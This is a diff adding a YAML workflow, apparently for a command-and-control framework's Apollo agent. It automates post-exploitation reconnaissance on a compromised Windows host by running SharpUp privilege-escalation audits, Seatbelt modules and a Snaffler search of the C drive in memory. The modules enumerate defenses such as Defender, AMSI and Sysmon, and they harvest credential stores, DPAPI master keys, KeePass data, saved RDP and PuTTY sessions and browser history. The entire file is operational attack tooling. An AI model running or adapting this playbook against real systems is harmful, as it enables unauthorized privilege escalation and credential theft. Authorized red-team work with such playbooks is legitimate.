@@ -1,0 +1,203 @@
+name: "Apollo Privilege Escalation Checks"
+description: "Perform automated checks"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# SharpUp
+###########################################################
+  - name: "register forge_net_SharpUp"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: SharpUp
+        remove: false
+
+  - name: "execute forge_net_SharpUp"
+    depends_on:
+      - "register forge_net_SharpUp"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_SharpUp
+      payload_type: forge
+      params_dictionary:
+        args: audit
+        version: 4.7_Any
+        execution: inline_assembly
+
+###########################################################
+# Seatbelt
+###########################################################
+
+  - name: "register forge_net_Seatbelt"
+    depends_on:
+      - "execute forge_net_SharpUp"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: Seatbelt
+        remove: false
+
+  - name: "forge_net_Seatbelt os_info"
+    description: "Seatbelt OS information"
+    depends_on:
+      - "register forge_net_Seatbelt"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "OSInfo LocalGPOs OptionalFeatures DotNet Hotfixes MicrosoftUpdates InstalledProducts EnvironmentVariables EnvironmentPath Printers"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt defensive_controls"
+    description: "Seatbelt defensive controls"
+    depends_on:
+      - "forge_net_Seatbelt os_info"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "WindowsDefender AntiVirus AMSIProviders Sysmon WindowsEventForwarding WindowsFirewall AppLocker AuditPolicies AuditPolicyRegistry PowerShell McAfeeConfigs McAfeeSiteList SecurityPackages"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt privs_tokens"
+    description: "Seatbelt privileges, token, authentication"
+    depends_on:
+      - "forge_net_Seatbelt defensive_controls"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "TokenPrivileges UserRightAssignments TokenGroups LocalGroups LocalUsers UAC WindowsAutoLogon CredEnum SecPackageCreds WindowsVault WindowsCredentialFiles DpapiMasterKeys LAPS LSASettings NTLMSettings CredGuard CloudCredentials KeePass WifiProfile PuttySessions PuttyHostKeys MTPuTTY SuperPutty FileZilla OracleSQLDeveloper RDCManFiles"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt persistence"
+    description: "Seatbelt persistence, privileged execution"
+    depends_on:
+      - "forge_net_Seatbelt privs_tokens"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "AutoRuns ScheduledTasks Services WMIEventConsumer WMIEventFilter WMIFilterBinding NamedPipes PSSessionSettings SCCM WSUS"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt commands_history"
+    description: "Seatbelt command execution and history"
+    depends_on:
+      - "forge_net_Seatbelt persistence"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "PowerShellHistory PowerShellEvents ProcessCreationEvents SysmonEvents ExplorerRunCommands ExplorerMRUs OfficeMRUs LogonEvents ExplicitLogonEvents LogonSessions ChromiumHistory FirefoxHistory IEUrls OutlookDownloads SlackDownloads RecycleBin InterestingFiles SearchIndex IETabs ChromiumBookmarks IEFavorites OneNote IdleTime LastShutdown PoweredOnEvents"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt processes_network"
+    description: "Seatbelt processes and network activity"
+    depends_on:
+      - "forge_net_Seatbelt commands_history"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "InterestingProcesses Processes ProcessOwners TcpConnections UdpConnections DNSCache ARPTable NetworkShares MappedDrives NetworkProfiles InternetSettings RDPSessions RDPSavedConnections RDPsettings CloudSyncProviders azuread"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "forge_net_Seatbelt app_artifacts"
+    description: "Seatbelt app artifacts"
+    depends_on:
+      - "forge_net_Seatbelt processes_network"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Seatbelt
+      payload_type: forge
+      params_dictionary:
+        args: "ChromiumPresence FirefoxPresence SlackPresence SlackWorkspaces"
+        version: 4.7_Any
+        execution: inline_assembly
+
+###########################################################
+# Snaffler
+###########################################################
+  - name: "register forge_net_Snaffler"
+    depends_on:
+      - "forge_net_Seatbelt app_artifacts"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: Snaffler
+        remove: false
+
+  - name: "forge_net_Snaffler C_drive_search"
+    description: "Snaffler C drive search"
+    depends_on:
+      - "register forge_net_Snaffler"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Snaffler
+      payload_type: forge
+      params_dictionary:
+        args: '-s -i C:\'
+        version: 4.7_Any
+        execution: inline_assembly
+
